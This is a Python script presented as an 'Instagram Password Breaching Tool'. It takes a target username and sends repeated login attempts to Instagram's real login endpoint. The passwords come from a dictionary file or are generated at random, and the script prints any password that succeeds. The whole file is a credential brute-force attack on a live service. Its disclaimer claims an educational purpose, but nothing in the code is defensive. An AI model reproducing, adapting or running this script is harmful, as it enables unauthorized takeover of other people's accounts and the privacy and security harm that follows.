import requests
from bs4 import BeautifulSoup
import time
import re
import random
import string

def generate_random_password(length, strength):
    if strength == 'weak':
        characters = string.ascii_letters
    elif strength == 'medium':
        characters = string.ascii_letters + string.digits
    else:  # strong
        characters = string.ascii_letters + string.digits + string.punctuation

    return ''.join(random.choice(characters) for _ in range(length))

def main():
    logo = """
 _____           _          ____             _       ______
|_   _|         | |        |  _ \           | |     |  ____|
  | |  _ __  ___| |_ __ _  | |_) |_ __ _   _| |_ ___| |__ ___  _ __ ___ ___
  | | | '_ \/ __| __/ _` | |  _ <| '__| | | | __/ _ \  __/ _ \| '__/ __/ _ \\
 _| |_| | | \__ \ || (_| | | |_) | |  | |_| | ||  __/ | | (_) | | | (_|  __/
|_____|_| |_|___/\__\__,_| |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|

                      Instagram Password Breaching Tool

                      Note: This program does not guarantee
                      that the brute force will be successful.
                      This project is intended for educational
                      and ethical purposes only. It is designed
                      to raise awareness about cybersecurity
                      and the importance of strong passwords.
                      Unauthorized usage for malicious intent
                      is strictly prohibited. The developer
                      assumes no responsibility for any misuse
                      or unauthorized access. Use responsibly
                      and within the boundaries of applicable
                      laws and regulations.

                      Dev: @gyanprabhat
"""

    print(logo)

    username = input('Target Username: ')

    password_source = input('Choose Password Source (dictionary/random): ')

    login_url = 'https://www.instagram.com/accounts/login/'

    session = requests.Session()
    session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

    try:
        response = session.get(login_url)
        csrf_token = re.search(r'"csrf_token":"(.*?)"', response.text).group(1)

        if password_source == 'dictionary':
            dictionary = input('Choose Dictionary: ')
            with open(f'{dictionary}.txt', 'r') as file:
                bruteforce = [line.strip() for line in file]

            for brute in bruteforce:
                login_data = {
                    'username': username,
                    'password': brute,
                    'csrfmiddlewaretoken': csrf_token
                }
                response = session.post(login_url, data=login_data, allow_redirects=False)
                time.sleep(1)  # Wait for the login attempt

                if 'location' in response.headers and response.headers['location'] == 'https://www.instagram.com/':
                    print(f"Successful login - Username: {username}, Password: {brute}")
                    break
                else:
                    print(f"Unsuccessful login - Username: {username}, Password: {brute}")

        elif password_source == 'random':
            password_length = int(input('Enter Password Length: '))
            password_strength = input('Choose Password Strength (weak/medium/strong): ')

            for _ in range(5):  # You need to change this loop to match your intended behavior
                password = generate_random_password(password_length, password_strength)
                print(f"Generated Password: {password}")

                login_data = {
                    'username': username,
                    'password': password,
                    'csrfmiddlewaretoken': csrf_token
                }
                response = session.post(login_url, data=login_data, allow_redirects=False)
                time.sleep(1)  # Wait for the login attempt

                if 'location' in response.headers and response.headers['location'] == 'https://www.instagram.com/':
                    print(f"Successful login - Username: {username}, Password: {password}")
                    break
                else:
                    print(f"Unsuccessful login - Username: {username}, Password: {password}")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
